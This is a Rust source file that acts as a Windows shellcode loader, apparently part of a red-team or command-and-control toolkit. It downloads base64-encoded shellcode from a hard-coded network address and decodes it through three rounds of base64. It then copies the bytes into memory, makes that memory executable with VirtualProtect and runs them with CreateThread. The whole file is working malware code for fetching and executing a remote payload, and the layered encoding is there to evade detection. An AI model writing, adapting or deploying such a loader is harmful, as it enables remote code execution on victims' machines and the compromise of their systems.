extern crate reqwest;
extern crate base64;
extern crate tokio;

use reqwest::Client;
use base64::decode;
extern crate winapi;
extern crate kernel32;
use winapi::um::winnt::{
    PROCESS_ALL_ACCESS,
    MEM_COMMIT,
    MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    PAGE_EXECUTE_READ,
    PAGE_READWRITE,
    PVOID
};
use winapi::um::{
    errhandlingapi,
    processthreadsapi,
    winbase, 
    synchapi::WaitForSingleObject
};
use std::ptr;


const URL: &str = "http://192.168.1.114:8443/note.txt";
// const SHELLCODE_LEN: usize = 200262;
const B64_ITERATIONS: usize = 3;

fn decode_shellcode(sc: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    // logger.debug(log_out!("Starting shellcode debug"));
    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
    for _i in 0..b64_iterations {
        // logger.debug(log_out!("Decode iteration: ", &i.to_string()));
        match decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d
                    .into_iter()
                    .filter(|&b| b != 0x0a)
                    .collect();
            },
            Err(e) => { 
                let err_msg = e.to_string();
                // logger.err(err_msg.to_owned());
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}

async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            // logger.info(log_out!("Downloaded shellcode")); 
            // Get the shellcode. Now we have to decode it
            let shellcode_decoded: Vec<u8>;
            let shellcode_final_vec: Vec<u8>;
            if let Ok(sc) = r.text().await {
                // logger.info(log_out!("Got encoded bytes"));
                // logger.debug(log_out!("Encoded shellcode length: ", &sc.len().to_string()));
                match decode_shellcode(sc, b64_iterations) {
                    Ok(scd) => { shellcode_decoded = scd; },
                    Err(e)  => { return Err(e); }
                }; 
    
    
                // Convert bytes to our proper string
                // This only happens on Windows
                let shellcode_string: String;
                if let Ok(s) = String::from_utf8(shellcode_decoded) {
                    shellcode_string = s;
                } else {
                    let err_msg = "Could not convert bytes to string";
                    // logger.err(err_msg.to_owned());
                    return Err(err_msg.to_owned());
                }                    
                // At this point, we have the comma-separated "0xNN" form of the shellcode.
                // We need to get each one until a proper u8.
                // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
                // Not '0x' strings for Linux.
                shellcode_final_vec = shellcode_string
                    .split(",")
                    .map(|s| s.replace("0x", ""))
                    .map(|s| s.replace(" ", ""))                    
                    .map(|s|{ 
                        match u8::from_str_radix(&s, 16) {
                            Ok(b) => b,
                            Err(_) => 0
                        }
                    })
                    .collect();
                
                // The actual success
                return Ok(shellcode_final_vec);

            } else {
                let err_msg = "Could not decode shellcode";
                // logger.err(err_msg.to_owned());
                return Err(err_msg.to_owned());
            }

        } else {
            return Err(r.text().await.unwrap());
        }   

    } else {
        return Err("Could not download shellcode".to_string());
    }
} 

#[tokio::main]
async fn main() {

    // Grab b64-encoded data from the provided url
    // Decode n_iters times
    // CreateThread with the shellcode
    if let Ok(shellcode) = get_shellcode(URL.to_string(), B64_ITERATIONS).await {
        type DWORD = u32;

        unsafe {
            let base_addr = kernel32::VirtualAlloc(
                ptr::null_mut(),
                shellcode.len().try_into().unwrap(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if base_addr.is_null() {
                println!("Couldn't allocate memory to current proc.");
            } else {
                println!("Allocated memory to current proc.");
            }

            // copy shellcode into mem
            println!("Copying Shellcode to address in current proc.");
            std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
            println!("Copied...");

            // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
            println!("Changing mem protections to RX...");

            let mut old_protect: DWORD = PAGE_READWRITE;

            let mem_protect = kernel32::VirtualProtect(
                base_addr,
                shellcode.len() as u64,
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );

            if mem_protect == 0 {
                //let error = errhandlingapi::GetLastError();
                return println!("Error during injection");
            }

            // Call CreateThread
            println!("Calling CreateThread...");

            let mut tid = 0;
            let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };

            let h_thread = processthreadsapi::CreateThread(
                ptr::null_mut(),
                0,
                Some(ep),
                ptr::null_mut(),
                0,
                &mut tid,
            );

            if h_thread.is_null() {
                //let error = unsafe { errhandlingapi::GetLastError() };
                println!("Error during inject.");
            } else {
                println!("Thread Id: {tid}");
            }

            // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
            // I do not know if this will have side effects, but if you omit the WaitForSingleObject call, the ON agent can continue to function after the thread injection takes place.
            
            //logger.debug("Calling WaitForSingleObject...".to_string());

            if WaitForSingleObject(h_thread, winbase::INFINITE) == 0 {
               println!("Good!");
               println!("Injection completed!");
            } else {
               let error = errhandlingapi::GetLastError();
               println!("{error}");
            }
        }
    }
    
}
